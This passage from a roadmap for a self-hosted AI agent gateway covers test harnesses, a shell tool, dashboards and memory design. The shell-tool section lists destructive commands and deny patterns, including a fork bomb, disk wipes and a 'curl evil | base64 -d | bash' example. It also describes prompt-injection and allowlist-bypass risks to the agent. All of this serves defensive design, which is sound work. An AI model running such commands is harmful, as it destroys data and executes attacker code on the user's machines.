- One event log per hub. No per-client buckets.
- No deduplication, counters, search UI. Flat append-only file; sort and filter at read time.
- No fancy approval UI. Telegram inline keyboard for `ask`; that's it.
- No heartbeat loop or self-directed tasks. Those need a separate Phase (see deferred).

*Full spec: `.kiro/specs/phase4.5-cron-events/` (to be written when this phase starts).*

---

## Phase 4.6 — End-to-end test harness (Spec-driven, ~1 weekend)

**Goal:** Catch the class of bugs that Phase 4.5 live-testing surfaced — before they ever reach live testing. Move from "you tap on Telegram, I read logs, we debug for hours" to "pytest runs the whole flow in-process, red suite catches the regression before the NAS ever rebuilds."

**Why now, why as its own phase:** the Phase 4.5 debug cycle produced a concrete list of bugs that were *detectable with tests we didn't write*. The stub library (`tests/_llm_stubs.py`) and unit-level tests we landed during 4.5 catch ~30% of that class. An end-to-end harness — drive the full HTTP + approval + scheduler + event-log pipeline in-process — would catch ~70%+. The incremental work is maybe one focused weekend; the payback is every subsequent phase (4.7 `project_shell`, 5 lessons, 6 spec-runner) where manual-test cycles get longer and the cost of each missed regression grows.

Writing this down as a phase — not a side-commit — so the rationale is preserved. If future-us wonders "why do we have `tests/e2e/`?" the answer is this spec, not a commit message.

**The bugs it would catch (enumerated from Phase 4.5 live testing, 2026-05-07):**

- `cron_fired` being double-delivered to Telegram alongside `cron_completed` (event pipeline test).
- Cron fires successfully in `events.jsonl` but push pipeline is missing (Task 7 gap would have been visible as "cron lifecycle ends before delivery").
- Model narrates tool_call JSON in `content` → ends up in `cron_completed.body` (stubbed LLM response feeding the full pipeline catches this).
- Approval created, middleware times out at 45s, decide POST returns 404 (approval-lifecycle test with time control catches this *category*; the specific PTB deadlock was bot-side and would need its own test, already shipped as `test_build_application_enables_concurrent_updates`).
- `fitt-smart` silent default violating "models are configuration" — an e2e test asserting the operator's configured alias is what the cron uses (not a hidden preference) pins the principle.
- Detach-threshold misconfiguration (threshold ≥ timeout) producing silent failure — already pinned by `test_inverted_detach_timeout_logs_warning` at unit level, but an e2e test end-to-end confirms the placeholder lands and the late event lands.
- Tool-turn poisoning: a session whose history contains prior failed `cron_add` attempts producing duplicate tool calls on the next request. Needs a harness that seeds session history and asserts on dispatched messages.

**The bugs it won't catch (honest scope):**

- PTB internal dispatch behaviour (handled by the bot-side test suite).
- Real model quality issues — that's `llm-checker toolcheck`'s job.
- Actual Telegram API quirks.
- Real Ollama / OpenRouter latency, retries, streaming bugs.
- Real SSH reachability + satellite behaviour.

**Key work:**

- **`tests/e2e/conftest.py`** — fixture that builds a full in-process gateway via `create_app(build_test_config(...))`, wires an in-process approval helper that can poll `/v1/approvals/pending` and POST `/v1/approvals/{id}/decide` as the bot would, a real (tmp_path) event log, and a cron service whose scheduler tick can be advanced deterministically.
- **`tests/e2e/test_cron_lifecycle.py`** — end-to-end:
  1. HTTP chat request with `tool_choice: auto` → stubbed LLM returns `cron_add` tool call
  2. Poll `/v1/approvals/pending` → confirm approval exists with the right args
  3. POST `/v1/approvals/<id>/decide` with `approve`
  4. Advance scheduler → assert `cron_fired` + `cron_completed` land in events
  5. Poll `/v1/events` → confirm push pipeline would see them
  6. Assert memory has the turn persisted
- **`tests/e2e/test_approval_lifecycle.py`** — covers the ask → pending → decide → continue path without involving crons. The baseline interaction shape for Phase 4.
- **`tests/e2e/test_detach_lifecycle.py`** — detach threshold trips → placeholder response → approval resolves → `late_tool_result` lands. Already has unit coverage in `test_detach.py`; the e2e version catches the full HTTP-through-events shape.
- **Time control.** The harness needs a knob to advance the clock — `freezegun` or a handrolled `Clock` protocol plumbed into `CronScheduler.tick(now=...)`. We already accept `now` as a parameter on `tick`, so this is mostly wiring.
- **Approval helper.** A small async fixture that acts as the bot would: polls `/v1/approvals/pending`, decides according to a test-supplied callback. Lets each test say "when an approval for tool X appears, approve it" or "reject it" without reinventing the polling loop.

**Scope boundaries (deliberate non-goals):**

- **No fake Telegram bot API.** Testing up to the push event is enough; what the bot does with a delivered event is its own test suite's concern. If we ever need to test "bot got event, bot sent Telegram message" the telegram-bot package tests can absorb it.
- **No `docker compose` in tests.** The harness runs in-process. Docker-level integration is a different problem (mainly configuration drift), addressed by live boot sanity + health checks, not pytest.
- **No real model calls.** Stubbed via `tests/_llm_stubs.py`. Real-model trajectory validation is `llm-checker toolcheck`'s job; keeping it out of the test suite keeps tests fast and deterministic.
- **No Telegram bot unit tests in scope here.** Bot-side behaviour (callback handler, poller, `concurrent_updates`, event formatter) stays in `telegram-bot/tests/`. The harness tests everything the gateway exposes to the bot; the boundary at the `/v1/*` HTTP surface is crisp.

**Prerequisites:** Phase 4.5 (the shared `_llm_stubs.py` library it already added).

*Full spec: `.kiro/specs/phase4.6-e2e-harness/`. Harness implementation landed 2026-05-08 — `tests/e2e/` holds the five lifecycle tests (U1.1–U1.5); retrospective scheduled for Phase 4.7 kickoff.*

---

## Phase 4.7 — `project_shell` tool (Spec-driven, ~1 weekend)

**Goal:** The agent can run arbitrary shell commands in a registered project, so it stops pretending to be a coding assistant without a shell and starts being one. Closes the single biggest honesty gap exposed by Phase 4 live use: "I can't run `git pull`" even though every primitive for that (backend, deny list, approval) was already built.

**Why now, why as its own phase:** the machinery has been sitting there since Phase 4 (`ExecutionBackend.run_shell`, `shell_command_for` hook on `Tool`, `deny_list.py`) with no consumer. We deliberately avoided adding the consumer earlier because "arbitrary shell" is a different security conversation than narrow tools. Phase 4.7 is that conversation written down. No new primitives needed — new tool, new deny patterns, new event kind, and a spec section that honestly enumerates what we are NOT protecting against.

**Key work:**

- **`project_shell(project, command, timeout_secs?)` inline tool.** Executes `command` in the project's directory via the existing `ExecutionBackend`. Shell-string invocation (`bash -c`), not argv array — preserves pipes, globs, redirection, which is the point. Default bucket `ask` across all clients; deny list runs before bucket resolution (unchanged Phase 4 wiring).
- **Per-client policy defaults.** `project_shell: ask` for CLI, Telegram, IDE. `project_shell: block` for Open WebUI (least-trust default, matching the Phase 4 posture). IDE can opt into `trust_session` via per-client override when the operator wants Continue-style flow.
- **Deny list extensions.** Add `rm -rf $FITT_HOME` (wipes identity, history, audit, crons, events), `rm -rf $HOME/.fitt` (same, different spelling), `git clean -fdx` (discards untracked + ignored, surprise factor), and a couple more documented in the spec's review section. Document explicitly that indirection patterns (`curl | bash` caught; `eval "$(curl ...)"`, `python -c '...'`, base64-decoded payloads) are NOT caught by design — the deny list is the floor for obvious catastrophes, not a sandbox.
- **`tool_executed` event kind.** Every approved / auto / trust_session invocation of `project_shell` emits an entry to the Phase 4.5 event log with the command, exit code, and duration. Telegram push delivers it to the phone near-real-time so the user can see the sequence of commands as they run — closes the "trust_session goes blind" gap that would otherwise make trust_session too dangerous to use.
- **Command display.** The approval prompt's `args_summary` caps at 200 chars; `project_shell` explicitly bypasses that cap so the full command reaches the phone before approval (up to a sane ceiling ~1000 chars, because a 10KB shell command is a prompt-injection smell).
- **`bash -c` detection.** Local hub uses `bash -lc <cmd>` by default. On Windows hubs we detect Git Bash (`C:\Program Files\Git\bin\bash.exe`) or WSL (`wsl -- bash -lc`); on failure, return a readable error at boot rather than letting shell tools silently run `cmd.exe`. SSH path is unchanged (the existing `ssh host 'cd path && cmd'` already wraps via the remote login shell).
- **Audit log unchanged.** Every invocation already hits `audit.jsonl` via the existing middleware — HMAC-chained, tamper-evident. The `tool_executed` event is the user-facing mirror; the audit entry is the forensic record.
- **`fitt audit tail` CLI.** Live-tail the audit log with a human-readable formatter. Trivial given the existing audit structure. Complements the Telegram push for operators who'd rather watch from the hub.

**Threat model (documented in the spec, not hidden in comments):**

The spec ships with an explicit threat-model section stating what v0 protects against and what it does not. This is the forcing function that separates real security from theater.

*Protected:* drunk-operator mistakes ("clear my project" → `rm -rf /`), well-known destruction patterns (`mkfs.*`, `dd of=/dev/sd*`, `git push --force`, `:(){ :|:& };:`), model typos on documented-catastrophic forms, accidental approval of commands where the full string is visible on the phone and readable.

*NOT protected:* a compromised model. Prompt injection via context the model absorbed (web page, document, cron-pulled RSS). Indirect destructive patterns (`curl evil | base64 -d | bash`, `eval "$(curl ...)"`, `python -c 'os.system(...)'`, env-var poisoning of the sort Cursor's 2026 CVE demonstrated). Filesystem damage outside the deny-listed paths. Supply-chain attacks via `pip install` / `npm install`.

The honest one-sentence framing lives in the spec verbatim: *"Phase 4.7 protects against operator mistakes and well-known destructive patterns; it does not protect against a compromised model or prompt-injection-borne commands at any point past the approval prompt. Do not enable `trust_session` for `project_shell` in sessions whose input channel might carry attacker-controlled content until sandboxing ships."*

**Explicit non-goals:**

- **No allowlist.** Empirical evidence in the industry (the "granular `Bash(...)` patterns fail on compound commands" post-mortem from Claude Code's user community, early 2026) shows granular allowlists fail on compound commands (`cd /repo && git fetch && git log | head`) because the classifier sees the whole string. Settings drift — every "always allow" click adds a new entry — makes the allowlist reconverge on the broken state. Deny list is the primitive; allowlist is abandoned.
- **No pattern-based "safe command" classification.** Cursor's CVE in 2026 (shell built-ins bypassing the allowlist via env-var poisoning) showed that command-string classifiers cannot capture execution context: `export LD_PRELOAD=...` never looks like a command, and poisoned environment turns subsequent "trusted" commands into RCE vectors. Our deny list is deliberately narrow and we document that narrowness; we do not ship a classifier that claims to know which commands are safe.
- **No sandbox in v0.** Listed in Phase 12+ as its own 2–3 week item. Sandbox is the correct long-term answer but it's operating-system-specific work (Landlock + seccomp on Linux, Seatbelt on macOS, WSL2 on Windows) and it doesn't belong bundled into Phase 4.7.
- **No interactive commands.** `BatchMode=yes` already on for SSH; locally no TTY. `vim`, `sudo` with password prompt, anything wanting a pty hangs and times out. Documented in the tool description so the model knows not to try.
- **No background processes.** `communicate()` waits for EOF on stdout/stderr. A daemon detached with `&` keeps the tool blocked for the full timeout. If the user wants a long-running daemon, they don't want it through FITT.

**Scope boundaries:**

- One tool (`project_shell`). Does not add `git_pull`, `git_fetch`, or other narrow git tools — if someone wants them, they can call `project_shell(project, "git pull")`. Removes the temptation to add five narrow tools every time a new shell use case comes up.
- No command allowlist / trusted-pattern layer. See non-goals.
- No sandbox integration. See non-goals.
- Deny list lives in code (`tools/deny_list.py`), not config. Operators who need a pattern added open a PR; that's the friction we want for the list to stay trustworthy.

*Full spec: `.kiro/specs/phase4.7-project-shell/`. Spec promoted 2026-05-08; implementation shipped 2026-05-08; live-validated 2026-05-08 (tool dispatch, pipes + compound commands over SSH, failure-path event emission, approval-UI cleanup). Deny list verified by unit + integration coverage; no live deny-list fire achieved because qwen2.5-coder:14b refuses obvious-dangerous patterns on its own before emitting a tool call. Future-model validation may observe a live fire; our machinery is ready.*

---

## Phase 4.8 — Visibility Proxies (Spec-driven, ~1 weekend)

**Goal:** Make what FITT is doing visible, without waiting for the full admin dashboard (now Phase 7). Ship small, cheap surfaces for the same data the dashboard will eventually render, in order of phone/IDE reach. Closes Problem D (invisibility) from `docs/hallucinations-and-poisoning.md` for the single-user case the author actually lives in.

**Why now, why as its own phase:** the full dashboard is a 2–3 weekend project; the reliability work of 2026-05-10 made it clear that the author is flying blind on several axes (tool results, claim mismatches, gap reports, approval state) and re-deriving what happened from `docker compose exec` into a remote shell is the friction that makes `fitt inbox` unused in practice. The proxies are each a few hours, each independently useful, each reusable when the dashboard lands (they read the same files).

**Key work, in dependency order:**

- **Per-turn event stream + pub/sub hook.** Structured event emission alongside today's `events.jsonl` for everything that happens inside a tool-using turn: `turn_started`, `llm_call_started` / `completed` (with model, latency, token counts, cost), `tool_call_planned` (name + args), `approval_requested` / `decided`, `tool_call_executed` (result summary, exit code for shell, duration), `gap_reported`, `turn_finished`. Per-session-per-day JSONL at `$FITT_HOME/sessions/<session>/turns/<YYYY-MM-DD>.jsonl`, same shape as `history/<YYYY-MM-DD>.md`. `TurnLog` also exposes `subscribe(callback)` for in-process live consumers (the Telegram renderer). The backend for every later surface; both the tailers and the renderer read from the same source.
- **Telegram live-turn renderer.** Subscribes to `TurnLog` over the SSE endpoint (4.8c). MeshClaw-inspired three-bubble shape per turn: one growing stream bubble with task-card-style tool-call status lines and narration text (silent edits throughout), zero or more notifying approval bubbles that edit-in-place to their outcome, and a tiny notifying finish footer ("✓ Finished in 9s"). Phone notifies exactly on blocking approvals and at turn end. Short chat turns skip the growing bubble entirely and preserve today's single-message behaviour. Timeline ordering is correct by construction — every bubble's send timestamp is at or after its related content. Fixes the 2026-05-12 "approval floats between messages" bug.
- **`fitt watch` CLI.** Tails the active session's `turns/<YYYY-MM-DD>.jsonl` with a concise renderer: one line per event, color-coded, tool calls expanded inline. Replaces "grep seven files" with one command the author actually runs. Works under `docker compose exec gateway fitt watch`.
- **HTTP read endpoints.** `GET /v1/events?since=<ts>&kind=<k>&session=<s>`, `GET /v1/audit?since=<ts>`, `GET /v1/capability-gaps`, `GET /v1/sessions/<id>/turns`, `GET /v1/sessions/<id>/turns/stream` (SSE). JSON responses, bearer auth (same tokens as chat). The SSE stream is what the Telegram live-turn renderer subscribes to; the paged JSON endpoints are what curl, scripts, and the future dashboard read. Opens the door for non-FITT clients (Raycast, Alfred, custom widgets) without exposing `$FITT_HOME` over SSH.

**Deferred to post-v1:**

- **Telegram `/inbox` historical browser.** Originally sub-phase 4.8e as a paged reader over `events.jsonl`; reshaped around the live renderer instead. Add back if scrolling past turns on the phone becomes an actual daily friction.
- **HTML viewer / barebone dashboard.** Originally sub-phase 4.8e. Deferred to Phase 7 as part of the real admin dashboard — the daily phone surface is Telegram (live-turn renderer) and splitting a stepping-stone HTML viewer from the eventual editable dashboard would mean maintaining two viewers for the same data.

**Scope boundaries:**

- No writes from HTTP. Read-only surface. Writes still go through chat / CLI.
- No authentication beyond the bearer token that already exists. No per-event ACLs.
- No rotation knob for `turns/<date>.jsonl` in this phase. Same posture as `events.jsonl` and `audit.jsonl` — append-only, history pruner handles retention via the shared `memory.history_max_days` setting.
- No dashboard. The real `$FITT_HOME` admin UI with edit capability, config diffing, session browser, and live turn view is Phase 7. This phase is the "can I see what FITT is doing right now, on my phone" floor.

**Prerequisites:** Phase 4 (event log), Phase 4.5 (events.jsonl persistence), Phase 4.7 (tool-call events with enough structure to render).

*Full spec: `.kiro/specs/phase4.8-visibility-proxies/` (promoted 2026-05-11; reshaped 2026-05-12 around a MeshClaw-inspired growing-bubble Telegram live-turn renderer after reading MeshClaw's Slack gateway source). Four sub-phases: 4.8a backend + subscribe hook → 4.8c HTTP endpoints + SSE → 4.8b Telegram live-turn renderer → 4.8d `fitt watch` CLI. HTML viewer (former 4.8e) deferred to Phase 7 as part of the real admin dashboard. Total ~6 days focused work; sub-phases ship piecemeal.*

---

## Phase 5 — Lessons + Decaying History (Spec-driven, ~1 weekend)

**Goal:** FITT remembers what you told it last month. "Monitor training pid 456" just works because the pattern was learned from an earlier conversation.

**Key work:**

- **Lessons store.** `$FITT_HOME/lessons.md` — plain markdown, bullets or short paragraphs. Hand-editable. Injected into every system prompt as a `[Learned corrections]` block, capped at ~50 entries, oldest-pruned.
- **Lessons tools.** `learn_add(text, category?)`, `learn_list()`, `learn_remove(substring)`. Agent calls `learn_add` when the user says "remember", "always use X", "never Y", or after an observed correction.
- **`fitt learn` CLI.** Non-chat interface for direct editing (add/list/remove).
- **Decaying history injection.** When the gateway builds context for a request:
  - Today's session history: injected in full (same as Phase 2).
  - Yesterday: first entry + count, truncated.
  - Days 3-30 ago: one-line marker per day (date + entry count).
  - Day 30+: dropped from context. Files stay on disk.
  - Total history budget capped at ~6000 chars.
- **History pruning.** Nightly task deletes `history/YYYY-MM-DD.md` files older than `memory.history_max_days` (default 90, configurable).

**Out of scope (deferred to Phase 8 / 9):**

- Vector embeddings / semantic search.
- Episodic memory with similarity retrieval.
- Automatic preferences/projects consolidation (LLM rewrite of `preferences.md` from recent messages).
- Cross-session memory bleed (each session's history stays isolated; identity + lessons shared).

**Known issue to address in this phase — tool-turn structure.**

Today (Phase 4) history persists only two pieces of each turn: the user message and the assistant's final natural-language reply. Tool calls and tool results are ephemeral — they live inside the tool-call loop for one turn and are never written to disk.

This is fine for turns without tools. For turns *with* tools it poisons future context. Observed: in a session where SSH was briefly unreachable, the assistant's final reply ("I can't reach SSH, please configure keys...") got persisted as if it were a factual claim. On subsequent turns — even after SSH was fixed — the model read its own past refusal, pattern-matched on it, and kept refusing to call the tool. The tool result (`ok`) was never visible because tool results aren't persisted.

Fix (to be specced inside this phase): persist tool-using turns with a structured tool-call record so reloading gives the model something like:

- `role: user`: verbatim
- `role: assistant` with `tool_calls`: name + args summary (short, factual)
- `role: tool`: the outcome only (`ok` / brief error summary — not the full output which may be large and may be stale tomorrow)
- `role: assistant`: the final natural-language reply (as today)

On-disk format stays markdown-first. The tool-call record lives in a structured block inside the turn (parseable header like `[tool calls]` with one bullet per call, similar to how the `##` timestamp headers work today). Decay policy applies uniformly: older tool-using turns get truncated the same way older text-only turns do.

The critical rule: the natural-language paraphrase is never loaded without the tool-call record that generated it. A model reading history can tell that the paraphrase "I can't reach SSH" contradicts the tool outcome `ok` and discount it.

Until this ships, the workaround is to start a fresh session when poisoning happens: `fitt session new <name>` (or manually delete today's history file for the session).

*Full spec: `.kiro/specs/phase5-lessons/`. Spec promoted 2026-05-08; implementation shipped 2026-05-08 (lessons + `learn_*` tools + `fitt learn` CLI + tool-turn structured persistence + decaying history injection + background history pruner). The strict-xfail session-poisoning e2e test flipped green unassisted — the Phase 5 binary gate. Live validation pending.*

---

## Phase 6 — Spec-Runner: Unattended Coding (Spec-driven, ~1-2 weekends)

> **Reshape note (2026-05-15, captured here 2026-05-22).** The
> project-overview steering file is now explicit that FITT is
> not a coding agent. Phase 6 as originally framed ("FITT writes
> code from a spec") shouldn't ship in that shape. If revisited,
> it should be reshaped to "FITT hands tasks to OpenCode (or
> another dedicated coding CLI) and monitors progress" — the
> orchestrator-wraps-coding-CLI pattern from MeshClaw / Hermes
> rather than the build-a-coder pattern. The spec under
> `.kiro/specs/phase6-spec-runner/` predates this decision and
> describes the original framing; treat it as historical context,
> not as the work to do. The phase number stays vacated rather
> than re-purposed so the trail of "what happened to Phase 6"
> stays discoverable.

**Goal (original; superseded — see reshape note above):** Hand FITT a `tasks.md` and walk away. It walks unchecked tasks in order, each one in its own session, commits per task, stops on first blocker. Works overnight.

**Key work:**

- **Task-runner subsystem.** `fitt task run <spec-dir>` (CLI) or `task_run` tool (from any client). Takes a path to a `.kiro/specs/<feature>/` directory. Walks `tasks.md`.
- **Worktree isolation on the execution host.** For each run, creates a fresh git worktree on the project's declared `ssh_host`: `git worktree add <worktree-path> -b fitt/<feature>-<ts>`. All work happens there; the user's main checkout is never touched.
- **Per-task session.** Each unchecked task spawns a fresh sub-session, memory-injected, spec-aware. Tools: full Phase 4 set. Approval mode: inherit from task config (default `auto` for tasks approved at run-creation time).
- **Commit per task.** After each passing task: `git add -A && git commit -m "<task title>"`. One clean commit per task on the worktree's branch.
- **Cycle detection.** Same error 3x on a task → fail the task, notify, stop the run.
- **Stop on first unrecoverable failure.** No replan. User sees the blocker in Telegram + the event log; they decide: fix manually, skip, rethink.
- **Checkbox-based checkpointing.** `spec_mark_task` updates `tasks.md`. On resume, unchecked = still todo. No separate `TASK_PROGRESS.md` file needed.
- **Per-task timeout.** Configurable (default 30 min). Timeout → task fails, run stops.
- **Notifications per task.** Start / success / failure each emit an event (Phase 4.5 event log + Telegram push).

**Deliberate non-goals (deferred):**

- **No planner.** We don't decompose free-text into tasks. The `tasks.md` authored collaboratively with the human _is_ the plan.
- **No replan.** One step blocking stops the run.
- **No self-review.** Trust the executor. Trust tests. (A failed test is a failed task.)
- **No parallel step execution.** Sequential only.
- **No acceptance review.** The spec's `tasks.md` sub-tasks are the acceptance.
- **No watchdog for stalled sessions.** Per-task timeout is enough.

The deferred list is deliberate: each of these earns its place later if we feel its absence. They're big features in internal tools; for FITT v1 with a well-factored `tasks.md`, they're probably unnecessary.

**Prerequisites:** Phase 4 (tools + ssh backend + project registry), Phase 4.5 (events + notifications).

*Full spec: `.kiro/specs/phase6-spec-runner/` (to be written when this phase starts).*

---

## UX backlog (small issues, no urgency)

Moved to [`docs/observed-issues.md`](./docs/observed-issues.md)
on 2026-05-11. The roadmap stays focused on direction; that doc
is the running log of friction and small design problems from
live use. Promote an entry into a phase spec here when it starts
to hurt enough to shape one.

---

## Phase 7 — Visibility & Traceability (Spec-driven, ~3-5 weekends)

**Goal:** Make what FITT is doing visible while it's happening,
AND make what FITT did fully reconstructable after the fact.
Stop debugging by ssh-into-container plus log-grep. As a
programmer building FITT, the operator should be able to trace
any surprising behaviour back to its exact dispatched prompt,
exact response, exact tool calls, exact context size — without
leaving Telegram or the dashboard.

**Why now, why as its own phase.** The 2026-05-22 granite-narration
debugging session crystallised the gap. Granite 3.3 8B was bound
to `fitt-default`. Telegram users got narrated JSON ` ```json{"name":
"web_search", ...}``` ` instead of real `tool_calls`. To diagnose,
we had to: read source for the chat handler and agent loop, ssh
into the hub, run curl directly against Ollama, run curl through
the gateway with `coding-agent` mode to bypass FITT's prompt,
compare token counts (159 bare vs 5400 with FITT's system prompt)
to discover the system-prompt size was the load-bearing variable.
None of that should be the daily-debugging path. The same
session also revealed FITT has no awareness of per-binding
context windows (Ollama's `num_ctx` lives outside the gateway;
operators can set it to 256k as the user did, or leave it at
2048 default, and FITT can't tell you which). Both are
visibility gaps that compound: future compaction (Phase 8) needs
context-window awareness as a foundation, and any future model
swap needs traceability to know whether the swap actually
helped.

Phase 4.8 already shipped *live* visibility (per-turn event stream,
Telegram live-turn renderer, `fitt watch` CLI, `/v1/events` SSE).
This phase extends the same data substrate two new directions:
*traceability* (per-turn capture of dispatched prompt, response,
context size — replayable after the fact) and *operator surfaces*
that don't require ssh (Telegram commands and a real dashboard).

**Key work, in dependency order:**

- **Slice 7.1 — Context awareness.** Discover and surface
  per-binding context window. For Ollama, query `POST /api/show`
  for each bound model and parse the effective `num_ctx`
  parameter (the modelfile's setting if any; the architecture
  ceiling otherwise). For OpenAI-shape providers (OpenRouter,
  NIM, Groq), query `/v1/models` for `context_length`. For
  Anthropic, ship a small lookup table keyed on family. Cache
  results per-binding, refresh on gateway boot. Fail loud
  (Principle 11) when discovery fails — operator should see
  "context window unknown for model X" in the logs at boot, not
  silently get a default. Per-turn token measurement uses
  `usage.prompt_tokens` from the upstream response (already
  available, free); pre-dispatch counting via
  `litellm.token_counter()` lands when Phase 8 compaction needs
  it, not now. Half a day to a day. Foundation for everything
  below.

- **Slice 7.2 — Per-turn traceability capture.** Extend Phase 4.8's
  TurnLog to record, per turn: the full dispatched message list
  (system + history + user, post-injection); the upstream
  response object; the tool-call chain (planned, executed,
  approved/rejected); `prompt_tokens`, `completion_tokens`,
  `finish_reason`, `model_used`, `fallback_used`,
  `context_window`, `prompt_pct_of_window`. Storage policy:
  bodies persist as a sidecar JSON next to the turn's JSONL
  events, retention-bound by the existing `memory.history_max_days`
  history pruner. Privacy: optional `traceability.enabled` config
  (default off when secrets are in the request body, e.g.
  router-mode IDE clients pasting tokens; default on for
  Telegram / cron). Every turn is replayable: `fitt turn show
  <turn_id>` dumps the full chain in order. A day or two.

- **Slice 7.3 — Telegram operator commands.** `/model` (current
  alias bindings; last-turn detail; warnings), `/lastturn` (full
  chain detail for the most-recent turn in this chat),
  `/status` or `/health` (system-level — MCP servers, cron,
  pruner cadences, gateway uptime), `/eval <alias>` (kicks the
  existing eval harness for an alias and posts the report
  inline). Each command surfaces the data Slice 7.2 captured,
  in a phone-readable shape. Plus the always-on bit: render the
  concrete model used in the existing turn-finished footer (the
  gateway already sets `X-FITT-Backend`; bot drops it today). 1-2
  days for the commands; few minutes for the footer.

- **Slice 7.4 — Telegram markdown renderer.** CommonMark →
  Telegram HTML via `markdown-it-py`, whitelist-sanitised to
  Telegram's allowed tag set (`<b>`, `<i>`, `<code>`, `<pre>`,
  `<a>`, `<blockquote>`, `<tg-spoiler>`), applied in
  `streaming.py`'s `_flush` and in the event-push formatter.
  HTML not MarkdownV2 because a half-written `<b>` degrades
  gracefully under streaming edits while a half-written `*…*`
  crashes the MarkdownV2 parser for the whole message.
  Independent of the rest of the slice — could ship first if
  someone has half a day and a phone full of asterisks.

- **Slice 7.5 — Dashboard v0.** FastAPI + HTMX over the existing
  Phase 4.8c HTTP endpoints (`/v1/events`, `/v1/audit`,
  `/v1/turns`, `/v1/sessions`, `/v1/capability-gaps`) plus the
  new traceability endpoints from Slice 7.2. Read-only at v0;
  edit support deferred to a follow-up phase when the read-only surface
  has earned its keep. Six core views per the OpenClaw audit's
  borrow-list: `overview` (is FITT okay right now), `aliases`
  (binding state, last probe, last eval, context window, recent
  dispatches), `turns` (per-session turn browser with full
  per-turn detail from Slice 7.2 — the centerpiece for
  traceability), `tools` (registered tools, per-client buckets,
  invocation history), `cron` (jobs, next/last firing, outcome),
  `audit` (filtered tail of `audit.jsonl`). Plus a `gaps` page
  for the capability-gap log and a `health` page for MCP /
  pruner / event-pruner status. Live SSE-backed turn view reuses
  the existing `TurnLog.subscribe` infrastructure (Phase 4.8b)
  rather than reimplementing renderer logic — same architectural
  rule Hermes documented as "don't reimplement the chat
  experience; reuse the event stream." Tailscale-only by default,
  bearer-auth (or session cookie issued from a small login
  page). 2-3 weekends for the dashboard alone — the bulk of
  this phase's calendar time.

**Slice ordering rationale.** 7.1 is prerequisite for the
context-window display in 7.3, 7.5, and for Phase 8's compaction
trigger. 7.2 is prerequisite for the per-turn detail in 7.3 and
for the dashboard's `turns` view. 7.3 and 7.4 are independent of
each other — pick whichever scratches the day's itch first. 7.5
depends on everything above for the data; everything above is
useful even without 7.5 shipping (Telegram commands cover the
phone case; the dashboard covers the desk-debug case). Ship the
slices independently as they're ready.

**Architectural rules captured during design:**

- **Don't duplicate render logic.** Hermes documented this as the
  one architectural rule worth borrowing from their dashboard:
  "the chat pane should not be a second implementation of the
  Telegram-style rendering." Dashboard is a consumer of the
  event stream the Telegram renderer publishes, not a parallel
  implementation. See docs/prior-art.md for the full reasoning.
- **Same data, two surfaces.** Telegram commands and dashboard
  views read from the same gateway endpoints. New surfaces should
  add new endpoints to that catalogue, not split into per-surface
  data acquisition.
- **No new chat surface.** The dashboard is explicitly an
  operator pane, not a third chat client (Telegram and Open
  WebUI cover that). Resist the bloat.
- **Programmer-grade traceability.** Per-turn capture is the load-
  bearing piece. A complaint of the form "this Telegram reply
  looked weird" must be traceable to its exact dispatched body,
  exact response, exact tool calls — within seconds, not minutes.

**Scope boundaries:**

- **No edit support in dashboard v0.** Read-only. Editing
  `config.yaml`, `secrets.yaml`, `projects.yaml`, `cron.json`,
  identity files, lessons through the UI is a follow-up
  once the read-only surface has earned its weight.
- **No realistic-prompt eval harness in this phase.** The granite
  case taught us the eval should be runnable with FITT's actual
  system prompt to surface size-sensitive failures. That's a
  follow-up extension to the existing `alias_eval`, not part of
  Phase 7's scope. Tracked in the opportunistic list below.
- **No live config reload.** Today's restart-to-pick-up-config
  posture is fine for v0. Hot reload is its own can of worms
  (validation, atomic application, error recovery) and can wait.
- **No multi-tenant auth.** Single-user posture; the dashboard
  trusts whoever's on the tailnet with a bearer token. Per-user
  authorization (matters when a second person joins the operator
  Telegram chat — see Hermes-audit borrow-list) is a small
  follow-up, not a Phase 7 blocker.

**Prerequisites:** Phase 4 (event log), Phase 4.5 (events.jsonl
persistence), Phase 4.7 (project-aware tool-call events), Phase
4.8 (per-turn event stream + SSE endpoint). Effectively
everything that ships per-turn detail today; Phase 7 adds capture
+ traceability + operator surfaces on top.

*Full three-file spec to be written under
`.kiro/specs/phase7-visibility-traceability/` when this phase
starts, in the same shape as Phase 4.8's spec.*

**Status (2026-05-24):** spec promoted, all five slices
shipped. Slice 7.5 v0 (read-only operator dashboard) is on
`origin/main` plus the F9 introspection follow-up
(settings / projects / identity / skills / sessions / cost).
Two-week Principle 9 window is in progress before flipping
the phase to DONE.

**Phase 7 v1 (the dashboard's edit + actions road).** A
deliberate sequence captured in `tasks.md` followups F10-F17,
scheduled to land after the v0 surface earns its keep:

- F10 — dashboard edit substrate (CSRF + optimistic-mtime
  + audit-on-edit). Foundation only; no surfaces yet.
- F11 — edit for `identity.md` + `lessons.md`. First user
  of F10. Smallest blast radius.
- F12 — edit for `projects.yaml` + `cron.json`. Reuses the
  existing `cron_*` tools' code path.
- F13 — edit for `skills/<name>/SKILL.md`. Frontmatter
  validation; restart-to-reload banner.
- F14 — edit for `config.yaml`. Validation runs the boot
  graph; restart-to-apply default unless live use makes
  hot-reload obviously earn its complexity.
- F15 — edit for `secrets.yaml`. Per-key form, never
  render values, double-confirm, dedicated audit
  category. Last by design — highest attack surface.
- F16 — typed dashboard action buttons (Refresh aliases,
  Restart MCP, Verify audit, Pause/Resume cron, Run
  eval). Each button is a typed POST to a named endpoint;
  no generic `fitt` CLI runner (security posture, see
  operator-feedback note 2026-05-24).
- F17 — dashboard live turns view (SSE-subscribe to
  the existing `/v1/sessions/<s>/turns/stream`). Was
  Slice 7.5 Task 26c, deferred.

Each item earns the next based on real use, not anticipated
use. The shape mirrors what MeshClaw / OpenClaw dashboards
do well: section-per-feature including config introspection,
not just operational debug. The schedule is committed; the
calendar isn't — Principle 9 stays load-bearing.

---

## Phase 8 — Compaction (Spec-driven, ~1 weekend)

**Goal:** Stop today's history from quietly blowing past the
context window over a long session. Adopt the
proven Claude Code / Cursor / OpenClaw / Hermes pattern: when a
session's history passes a threshold, summarize the older half
into a `# Compacted <date>` system block and keep only the tail
verbatim.

**Why this phase exists separately.** It's been documented in
`docs/hallucinations-and-poisoning.md` (action item 5: 40KB
threshold, `# Compacted <date>` section, `memory.compaction_prompt`
config, `fitt-fast` for summarization, "biggest Problem B win")
and in `docs/prior-art.md` (OpenClaw and Hermes both have it,
both audits identify it as the pattern worth porting once FITT
needs it) since spring 2026. It was always part of the bundled
"Phase 7 — vector memory + admin UI" line. Splitting it out into
its own phase 2026-05-22 makes its prerequisite chain explicit
